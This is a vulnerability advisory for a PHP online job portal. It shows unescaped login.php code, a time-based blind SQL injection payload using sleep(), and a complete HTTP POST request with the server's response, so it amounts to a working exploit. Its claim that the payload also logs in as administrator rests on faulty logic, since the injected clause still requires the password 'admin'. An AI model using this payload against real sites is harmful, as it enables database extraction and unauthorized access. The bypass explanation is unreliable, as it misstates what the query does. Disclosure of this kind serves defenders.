## ONLINE_JOB_PORTAL_SYSTEM login.php Time-Based Blind SQL Injection Vulnerability

### I. Vulnerability Impact

The `txtPass` parameter of `login.php` is concatenated into the authentication query without any escaping, so an attacker can inject arbitrary SQL expressions into the `WHERE` clause. By placing a `sleep()` call inside the injected expression the attacker can delay the response at will and extract arbitrary data from the database character by character. The same parameter also allows the `WHERE` clause to be turned into a tautology, which lets an attacker log in as the administrator without knowing the password.

### II. Source Code Analysis

The vulnerability resides in `login.php`, lines 11-20:

```php
$UserName=$_POST['txtUser'];
$Password=$_POST['txtPass'];
$UserType=$_POST['cmbUser'];
if($UserType=="Administrator")
{
$con = mysqli_connect("localhost","root","","job");

$sql = "select * from user_master where UserName='".$UserName."' and Password='".$Password."'";
$result = mysqli_query($con,$sql);
$records = mysqli_num_rows($result);
$row = mysqli_fetch_array($result);
```

`$Password` is taken straight from `$_POST['txtPass']` and embedded inside a single-quoted literal in the `WHERE` clause of the login query. The value is never passed through `mysqli_real_escape_string()` and the query is not built with a prepared statement, so a single quote in the parameter terminates the `Password='...'` literal and everything after it is compiled as SQL syntax. The `JobSeeker` and `Employer` branches of the same file (lines 35 and 55) repeat the identical pattern against `jobseeker_reg` and `employer_reg`, so all three login roles are affected.

Because the column is compared against a string literal, no privileges are required to reach the injection: the parameter is processed before any authentication decision is made, and `mysqli_query()` executes the modified statement directly.

### III. Payload

The core injection payload is:

```
admin'and(select*from(select sleep(10))a)='
```

The resulting SQL statement executed by the server becomes:

```sql
select * from user_master where UserName='admin' and Password='admin'and(select*from(select sleep(10))a)=''
```

The leading `admin'` closes the `Password` literal and satisfies the first part of the query, `(select*from(select sleep(10))a)` wraps `sleep()` in a derived table so that it can be used as a scalar expression and forces MySQL to wait ten seconds, and the trailing `=''` re-balances the quote that the PHP template appends after the parameter. The subquery evaluates to `0`, and `0=''` is true in MySQL, so the `WHERE` clause also matches the administrator row and the request is accepted as a valid login.

```
POST /login.php HTTP/1.1
Host: job
Content-Length: 100
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Origin: http://job
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://job/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=a8lsjo418cuqjme60vfvhv159c
Connection: keep-alive

txtUser=admin&txtPass=admin'and(select*from(select+sleep(10))a)='&cmbUser=Administrator&button=Login
```

The response is returned after 10.19 seconds instead of immediately, and the body is the administrator panel rather than the "Wrong UserName or Password" alert, which confirms that the injected `sleep()` was executed by the database and that the `WHERE` clause was bypassed:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 08:14:10 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Set-Cookie: PHPSESSID=f1q8o2utdnft98p07cu2r4ak2f; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 8257

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>JOB PORTAL</title>
```

### IV. Source Download

https://code-projects.org/online-job-portal-system-in-php-with-source-code/



![image-20261030161532540](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030161532540.png)

